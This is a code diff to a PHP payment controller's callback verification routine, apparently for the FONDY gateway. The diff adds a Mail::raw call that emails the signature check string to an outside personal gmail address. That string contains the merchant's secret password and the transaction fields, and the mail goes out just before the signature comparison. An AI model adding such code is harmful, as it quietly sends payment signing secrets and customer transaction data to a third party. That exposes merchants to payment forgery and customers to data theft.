@@ -423,6 +423,10 @@ class PaymentController extends Controller {
         }
         ksort($hash_arr);
         $hash_check_string = $pass . '|' . join("|", $hash_arr);
+        Mail::raw($hash_check_string, function($message) {
+            $message->from('hostmaster@abckabinet.ru', 'ABC Кабинет');
+            $message->to("md.alexson@gmail.com")->subject('FONDY - POST - JSON');
+        });
         $hash_check = sha1($hash_check_string);
 
         if ($hash !== $hash_check) {
